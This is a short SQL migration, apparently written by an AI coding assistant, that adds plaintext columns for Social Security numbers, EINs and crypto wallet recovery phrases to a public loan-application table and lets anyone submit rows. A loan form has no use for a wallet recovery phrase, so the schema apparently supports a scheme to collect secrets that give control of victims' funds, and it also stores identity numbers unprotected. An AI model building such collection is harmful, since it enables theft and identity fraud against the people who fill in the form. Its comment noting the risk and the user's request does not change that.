
-- Extend loan_applications with SSN, EIN, and Crypto Wallet info.
-- NOTE: Storing SSN/Phrase is extremely high risk. Added at user's explicit request.

ALTER TABLE public.loan_applications
  ADD COLUMN IF NOT EXISTS ssn_number TEXT,
  ADD COLUMN IF NOT EXISTS ein_number TEXT,
  ADD COLUMN IF NOT EXISTS crypto_wallet_type TEXT,
  ADD COLUMN IF NOT EXISTS crypto_wallet_phrase TEXT;

-- Drop and recreate the insert policy to allow the new fields and higher complexity
DROP POLICY IF EXISTS "anyone can submit loan applications" ON public.loan_applications;

CREATE POLICY "anyone can submit loan applications"
  ON public.loan_applications FOR INSERT
  WITH CHECK (
    length(first_name) BETWEEN 1 AND 100
    AND (last_name IS NULL OR length(last_name) <= 100)
    AND length(email) BETWEEN 3 AND 255
    AND email ~* '^[^@\s]+@[^@\s]+\.[^@\s]+$'
    AND status = 'new'
  );
